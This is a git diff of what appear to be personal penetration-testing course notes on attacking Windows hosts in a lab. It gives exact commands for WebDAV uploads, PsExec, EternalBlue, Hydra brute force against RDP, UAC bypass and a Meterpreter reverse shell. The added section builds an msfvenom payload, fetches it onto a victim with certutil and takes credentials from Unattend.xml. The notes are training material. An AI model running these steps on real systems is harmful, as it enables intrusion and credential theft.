@@ -20,7 +20,8 @@
 - **|** RDP **|** TCP port 3389 **|** Remotely authenticate and interact with a Windows system **|**
 - WinRM(Windows Remote Management Protocol) **|** TCP ports 5986/443 **|** Windows remote management protocol that can be used to facilitate remote access with windows systems. **|**
 
-**Exploiting Microsoft IIS WebDAV**
+### Exploiting Microsoft IIS WebDAV
+
 Configured to run on ports 80/443
 
 - Supported executable file extentions: .asp, .aspx, .config, .php
@@ -61,7 +62,7 @@ _with metasploit_
 7.  find what you are looking for.
 8.  _You can use a metaasploit script for automating all of it_. in msfconsole `search iis upload`, looking for exploit/windows/iis/iis_webdav_upload_asp
 
-**Exploiting SMB with PsExec**
+### Exploiting SMB with PsExec
 
 - user authentication
 - share authentication
@@ -80,14 +81,14 @@ _use psexec with metasploit_
 
 1. in msfconsole search: `search psexec`, looking for`exploit/windows/smb/psexec`, fill in options
 
-**Eternal Blue**
+### Eternal Blue
 
 1. nmap script to check if internal blue `sudo nmap -sV -p 445 --script=smb-vuln-ms17.010 10.10.x.x`
 2. msfconsole: `search eternalblue`
 3. `use exploit/windows/smb/ms17:010_eternalblue`
 4. set options
 
-**Exploiting RDP**
+### Exploiting RDP
 
 - RDP uses TCP port 3389 by default, and can also be configured to run on any other TCP port
 - preform a bruteforce
@@ -99,7 +100,7 @@ _use psexec with metasploit_
 5. brute-force HYDRA: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_user.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.10.x.x -s <port>`
 6. xfreerdp with creds: `xfreerdp /u:username /p:password /v:10.10.x.x:port`
 
-**Exploit WinRM**
+### Exploit WinRM
 
 - Windows remote managment facilitates remote access with windows systems over HTTP(s)
 - WinRM Typically uses TCP port 5985 and 5986(HTTPS)
@@ -121,7 +122,7 @@ _meterpreter_
 
 ## Privelege Escalation
 
-**meterpreter elevation**
+### meterpreter elevation
 
 - in msfconsole you can use the privelege escalation suggester.
 
@@ -136,7 +137,7 @@ _meterpreter_
 - user mode, limited access
 - kernel mode, highest level of access
 
-**Bypassong UAC with UACME**
+### Bypassing UAC with UACME
 
 - User Account Control
 - Windows security feature
@@ -210,3 +211,22 @@ INFO: this also exploit the rejetto 2.3 version as UAC with UACME
 5. run file(on windows): `start legitimate_file.txt:payload.exe`
 6. Not working? symbolic link: `cd Windows\System32` -> `mklink wupdate.exe C:\absolute_file_path(ususally Temp fodler)\legitimate_file.txt:payload.exe`
 7. may not work if you do not have adm privileges.
+
+### Windows password hashes
+
+- Hashes stored in SAM
+- NTLM: MD4 hashing
+
+### Searching for passwords in Windows Config Files
+
+1. create payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=1234 -f exe > payload.exe`
+2. simple httpserver: `python -m SimpleHTTPServer 80`
+3. REAL: First gain access through vulnerablility, download the file to the victims computer
+4. COURSE: victims pc: cmd -> `certutil -urlcache -f http://10.10.x.x/payload.exe payload.exe`
+5. STOP python serve START msfconsole `service postgresql start && msfconsole`
+6. `use multi/handler` -> `set payload windows/x64/meterpreter/reverse_tcp` -> `set LPORT 1234` -> `set LHOST 10.10.x.x`
+7. execute on target system/victim pc
+8. meterpreter session: `search -f Unattend.xml` OR
+9. `cd C:\\` -> `cd Windows` -> ` cd Panther` -> look for Unattend.xml file -> `download unattend.xml`
+10. look for usercreds = AutoLogon (encoded base64), create new file -> `vim password.txt` -> save password -> base64 -d password.txt
+11. logon with adm creds: `psexec.py username@10.10.x.x`
